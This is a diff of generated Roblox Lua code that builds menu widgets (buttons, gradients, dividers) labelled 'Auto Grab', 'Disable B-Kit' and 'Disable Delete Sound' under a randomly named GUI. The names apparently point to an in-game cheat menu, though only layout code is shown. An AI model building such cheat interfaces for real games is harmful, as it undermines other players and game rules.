+G2L["250"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["250"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["250"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["250"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["250"]["Name"] = [[toggleFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.toggleFade.UIGradient
+G2L["251"] = Instance.new("UIGradient", G2L["250"]);
+G2L["251"]["Rotation"] = 90;
+G2L["251"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text
+G2L["252"] = Instance.new("TextLabel", G2L["24b"]);
+G2L["252"]["TextWrapped"] = true;
+G2L["252"]["BorderSizePixel"] = 0;
+G2L["252"]["TextSize"] = 14;
+G2L["252"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["252"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["252"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["252"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["252"]["BackgroundTransparency"] = 1;
+G2L["252"]["Size"] = UDim2.new(0, 156, 0, 20);
+G2L["252"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["252"]["Text"] = [[Auto Grab]];
+G2L["252"]["Name"] = [[text]];
+G2L["252"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text.UIPadding
+G2L["253"] = Instance.new("UIPadding", G2L["252"]);
+G2L["253"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text.text
+G2L["254"] = Instance.new("UIStroke", G2L["252"]);
+G2L["254"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.UIPadding
+G2L["255"] = Instance.new("UIPadding", G2L["24b"]);
+G2L["255"]["PaddingLeft"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound
+G2L["256"] = Instance.new("Frame", G2L["234"]);
+G2L["256"]["BorderSizePixel"] = 0;
+G2L["256"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["256"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["256"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["256"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["256"]["Name"] = [[disabledeletesound]];
+G2L["256"]["LayoutOrder"] = 4;
+G2L["256"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button
+G2L["257"] = Instance.new("TextButton", G2L["256"]);
+G2L["257"]["BorderSizePixel"] = 0;
+G2L["257"]["TextTransparency"] = 1;
+G2L["257"]["TextSize"] = 14;
+G2L["257"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["257"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["257"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["257"]["ZIndex"] = 49;
+G2L["257"]["BackgroundTransparency"] = 1;
+G2L["257"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["257"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["257"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.UIPadding
+G2L["258"] = Instance.new("UIPadding", G2L["257"]);
+G2L["258"]["PaddingTop"] = UDim.new(0, 2);
+G2L["258"]["PaddingRight"] = UDim.new(0, 3);
+G2L["258"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["258"]["PaddingBottom"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame
+G2L["259"] = Instance.new("Frame", G2L["257"]);
+G2L["259"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["259"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["259"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["259"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["259"]["Name"] = [[buttonFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.outlineStroke
+G2L["25a"] = Instance.new("UIStroke", G2L["259"]);
+G2L["25a"]["Thickness"] = 2;
+G2L["25a"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.buttonFade
+G2L["25b"] = Instance.new("CanvasGroup", G2L["259"]);
+G2L["25b"]["BorderSizePixel"] = 0;
+G2L["25b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25b"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["25b"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["25b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["25b"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.buttonFade.UIGradient
+G2L["25c"] = Instance.new("UIGradient", G2L["25b"]);
+G2L["25c"]["Rotation"] = 90;
+G2L["25c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.text
+G2L["25d"] = Instance.new("TextLabel", G2L["257"]);
+G2L["25d"]["ZIndex"] = 2;
+G2L["25d"]["BorderSizePixel"] = 0;
+G2L["25d"]["TextSize"] = 14;
+G2L["25d"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["25d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25d"]["BackgroundTransparency"] = 1;
+G2L["25d"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["25d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["25d"]["Text"] = [[Disable Delete Sound]];
+G2L["25d"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.text.text
-G2L["230"] = Instance.new("UIStroke", G2L["22f"]);
-G2L["230"]["Name"] = [[text]];
+G2L["25e"] = Instance.new("UIStroke", G2L["25d"]);
+G2L["25e"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.fillbar
-G2L["231"] = Instance.new("Frame", G2L["228"]);
-G2L["231"]["ZIndex"] = 90;
-G2L["231"]["BorderSizePixel"] = 0;
-G2L["231"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["231"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["231"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["231"]["Name"] = [[fillbar]];
-G2L["231"]["BackgroundTransparency"] = 0.95;
+G2L["25f"] = Instance.new("Frame", G2L["256"]);
+G2L["25f"]["ZIndex"] = 90;
+G2L["25f"]["BorderSizePixel"] = 0;
+G2L["25f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25f"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["25f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["25f"]["Name"] = [[fillbar]];
+G2L["25f"]["BackgroundTransparency"] = 0.95;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit
-G2L["232"] = Instance.new("Frame", G2L["206"]);
-G2L["232"]["BorderSizePixel"] = 0;
-G2L["232"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["232"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["232"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["232"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["232"]["Name"] = [[disablebkit]];
-G2L["232"]["LayoutOrder"] = 4;
-G2L["232"]["BackgroundTransparency"] = 1;
+G2L["260"] = Instance.new("Frame", G2L["234"]);
+G2L["260"]["BorderSizePixel"] = 0;
+G2L["260"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["260"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["260"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["260"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["260"]["Name"] = [[disablebkit]];
+G2L["260"]["LayoutOrder"] = 4;
+G2L["260"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button
-G2L["233"] = Instance.new("TextButton", G2L["232"]);
-G2L["233"]["BorderSizePixel"] = 0;
-G2L["233"]["TextTransparency"] = 1;
-G2L["233"]["TextSize"] = 14;
-G2L["233"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["233"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["233"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["233"]["ZIndex"] = 49;
-G2L["233"]["BackgroundTransparency"] = 1;
-G2L["233"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["233"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["233"]["Name"] = [[button]];
+G2L["261"] = Instance.new("TextButton", G2L["260"]);
+G2L["261"]["BorderSizePixel"] = 0;
+G2L["261"]["TextTransparency"] = 1;
+G2L["261"]["TextSize"] = 14;
+G2L["261"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["261"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["261"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["261"]["ZIndex"] = 49;
+G2L["261"]["BackgroundTransparency"] = 1;
+G2L["261"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["261"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["261"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.UIPadding
-G2L["234"] = Instance.new("UIPadding", G2L["233"]);
-G2L["234"]["PaddingTop"] = UDim.new(0, 2);
-G2L["234"]["PaddingRight"] = UDim.new(0, 3);
-G2L["234"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["234"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["262"] = Instance.new("UIPadding", G2L["261"]);
+G2L["262"]["PaddingTop"] = UDim.new(0, 2);
+G2L["262"]["PaddingRight"] = UDim.new(0, 3);
+G2L["262"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["262"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame
-G2L["235"] = Instance.new("Frame", G2L["233"]);
-G2L["235"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["235"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["235"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["235"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["235"]["Name"] = [[buttonFrame]];
+G2L["263"] = Instance.new("Frame", G2L["261"]);
+G2L["263"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["263"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["263"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["263"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["263"]["Name"] = [[buttonFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame.outlineStroke
-G2L["236"] = Instance.new("UIStroke", G2L["235"]);
-G2L["236"]["Thickness"] = 2;
-G2L["236"]["Name"] = [[outlineStroke]];
+G2L["264"] = Instance.new("UIStroke", G2L["263"]);
+G2L["264"]["Thickness"] = 2;
+G2L["264"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame.buttonFade
-G2L["237"] = Instance.new("CanvasGroup", G2L["235"]);
-G2L["237"]["BorderSizePixel"] = 0;
-G2L["237"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["237"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["237"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["237"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["237"]["Name"] = [[buttonFade]];
+G2L["265"] = Instance.new("CanvasGroup", G2L["263"]);
+G2L["265"]["BorderSizePixel"] = 0;
+G2L["265"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["265"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["265"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["265"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["265"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame.buttonFade.UIGradient
-G2L["238"] = Instance.new("UIGradient", G2L["237"]);
-G2L["238"]["Rotation"] = 90;
-G2L["238"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["266"] = Instance.new("UIGradient", G2L["265"]);
+G2L["266"]["Rotation"] = 90;
+G2L["266"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.text
-G2L["239"] = Instance.new("TextLabel", G2L["233"]);
-G2L["239"]["ZIndex"] = 2;
-G2L["239"]["BorderSizePixel"] = 0;
-G2L["239"]["TextSize"] = 14;
-G2L["239"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["239"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["239"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["239"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["239"]["BackgroundTransparency"] = 1;
-G2L["239"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["239"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["239"]["Text"] = [[Disable B-Kit]];
-G2L["239"]["Name"] = [[text]];
+G2L["267"] = Instance.new("TextLabel", G2L["261"]);
+G2L["267"]["ZIndex"] = 2;
+G2L["267"]["BorderSizePixel"] = 0;
+G2L["267"]["TextSize"] = 14;
+G2L["267"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["267"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["267"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["267"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["267"]["BackgroundTransparency"] = 1;
+G2L["267"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["267"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["267"]["Text"] = [[Disable B-Kit]];
+G2L["267"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.text.text
-G2L["23a"] = Instance.new("UIStroke", G2L["239"]);
-G2L["23a"]["Name"] = [[text]];
+G2L["268"] = Instance.new("UIStroke", G2L["267"]);
+G2L["268"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.fillbar
-G2L["23b"] = Instance.new("Frame", G2L["232"]);
-G2L["23b"]["ZIndex"] = 90;
-G2L["23b"]["BorderSizePixel"] = 0;
-G2L["23b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["23b"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["23b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["23b"]["Name"] = [[fillbar]];
-G2L["23b"]["BackgroundTransparency"] = 0.95;
+G2L["269"] = Instance.new("Frame", G2L["260"]);
+G2L["269"]["ZIndex"] = 90;
+G2L["269"]["BorderSizePixel"] = 0;
+G2L["269"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["269"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["269"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["269"]["Name"] = [[fillbar]];
+G2L["269"]["BackgroundTransparency"] = 0.95;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---
-G2L["23c"] = Instance.new("Frame", G2L["206"]);
-G2L["23c"]["BorderSizePixel"] = 0;
-G2L["23c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["23c"]["Size"] = UDim2.new(1, 0, 0, 10);
-G2L["23c"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["23c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["23c"]["Name"] = [[---DIVIDER---]];
-G2L["23c"]["LayoutOrder"] = 3;
-G2L["23c"]["BackgroundTransparency"] = 1;
+G2L["26a"] = Instance.new("Frame", G2L["234"]);
+G2L["26a"]["BorderSizePixel"] = 0;
+G2L["26a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26a"]["Size"] = UDim2.new(1, 0, 0, 10);
+G2L["26a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["26a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["26a"]["Name"] = [[---DIVIDER---]];
+G2L["26a"]["LayoutOrder"] = 3;
+G2L["26a"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame
-G2L["23d"] = Instance.new("Frame", G2L["23c"]);
-G2L["23d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["23d"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["23d"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["23d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["23d"]["Name"] = [[dividerFrame]];
+G2L["26b"] = Instance.new("Frame", G2L["26a"]);
+G2L["26b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["26b"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["26b"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["26b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["26b"]["Name"] = [[dividerFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.outlineStroke
-G2L["23e"] = Instance.new("UIStroke", G2L["23d"]);
-G2L["23e"]["Thickness"] = 2;
-G2L["23e"]["Name"] = [[outlineStroke]];
+G2L["26c"] = Instance.new("UIStroke", G2L["26b"]);
+G2L["26c"]["Thickness"] = 2;
+G2L["26c"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.buttonFade
-G2L["23f"] = Instance.new("CanvasGroup", G2L["23d"]);
-G2L["23f"]["BorderSizePixel"] = 0;
-G2L["23f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["23f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["23f"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["23f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["23f"]["Name"] = [[buttonFade]];
+G2L["26d"] = Instance.new("CanvasGroup", G2L["26b"]);
+G2L["26d"]["BorderSizePixel"] = 0;
+G2L["26d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["26d"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["26d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["26d"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
-G2L["240"] = Instance.new("UIGradient", G2L["23f"]);
-G2L["240"]["Rotation"] = 90;
-G2L["240"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["26e"] = Instance.new("UIGradient", G2L["26d"]);
+G2L["26e"]["Rotation"] = 90;
+G2L["26e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.UIStroke
-G2L["241"] = Instance.new("UIStroke", G2L["23d"]);
-G2L["241"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["241"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+G2L["26f"] = Instance.new("UIStroke", G2L["26b"]);
+G2L["26f"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["26f"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.UICorner
-G2L["242"] = Instance.new("UICorner", G2L["23d"]);
+G2L["270"] = Instance.new("UICorner", G2L["26b"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.UIPadding
-G2L["243"] = Instance.new("UIPadding", G2L["23c"]);
-G2L["243"]["PaddingTop"] = UDim.new(0, 3);
-G2L["243"]["PaddingRight"] = UDim.new(0, 6);
-G2L["243"]["PaddingLeft"] = UDim.new(0, 6);
-G2L["243"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["271"] = Instance.new("UIPadding", G2L["26a"]);
+G2L["271"]["PaddingTop"] = UDim.new(0, 3);
+G2L["271"]["PaddingRight"] = UDim.new(0, 6);
+G2L["271"]["PaddingLeft"] = UDim.new(0, 6);
+G2L["271"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick
-G2L["244"] = Instance.new("Frame", G2L["206"]);
-G2L["244"]["BorderSizePixel"] = 0;
-G2L["244"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["244"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["244"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["244"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["244"]["Name"] = [[fixbrick]];
-G2L["244"]["LayoutOrder"] = 4;
-G2L["244"]["BackgroundTransparency"] = 1;
+G2L["272"] = Instance.new("Frame", G2L["234"]);
+G2L["272"]["BorderSizePixel"] = 0;
+G2L["272"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["272"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["272"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["272"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["272"]["Name"] = [[fixbrick]];
+G2L["272"]["LayoutOrder"] = 4;
+G2L["272"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button
-G2L["245"] = Instance.new("TextButton", G2L["244"]);
-G2L["245"]["BorderSizePixel"] = 0;
-G2L["245"]["TextTransparency"] = 1;
-G2L["245"]["TextSize"] = 14;
-G2L["245"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["245"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["245"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["245"]["ZIndex"] = 49;
-G2L["245"]["BackgroundTransparency"] = 1;
-G2L["245"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["245"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["245"]["Name"] = [[button]];
+G2L["273"] = Instance.new("TextButton", G2L["272"]);
+G2L["273"]["BorderSizePixel"] = 0;
+G2L["273"]["TextTransparency"] = 1;
+G2L["273"]["TextSize"] = 14;
+G2L["273"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["273"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["273"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["273"]["ZIndex"] = 49;
+G2L["273"]["BackgroundTransparency"] = 1;
+G2L["273"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["273"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["273"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.UIPadding
-G2L["246"] = Instance.new("UIPadding", G2L["245"]);
-G2L["246"]["PaddingTop"] = UDim.new(0, 2);
-G2L["246"]["PaddingRight"] = UDim.new(0, 3);
-G2L["246"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["246"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["274"] = Instance.new("UIPadding", G2L["273"]);
+G2L["274"]["PaddingTop"] = UDim.new(0, 2);
+G2L["274"]["PaddingRight"] = UDim.new(0, 3);
+G2L["274"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["274"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame
-G2L["247"] = Instance.new("Frame", G2L["245"]);
-G2L["247"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["247"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["247"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["247"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["247"]["Name"] = [[buttonFrame]];
+G2L["275"] = Instance.new("Frame", G2L["273"]);
+G2L["275"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["275"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["275"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["275"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["275"]["Name"] = [[buttonFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame.outlineStroke
-G2L["248"] = Instance.new("UIStroke", G2L["247"]);
-G2L["248"]["Thickness"] = 2;
-G2L["248"]["Name"] = [[outlineStroke]];
+G2L["276"] = Instance.new("UIStroke", G2L["275"]);
+G2L["276"]["Thickness"] = 2;
+G2L["276"]["Name"] = [[outlineStroke]];
 
 
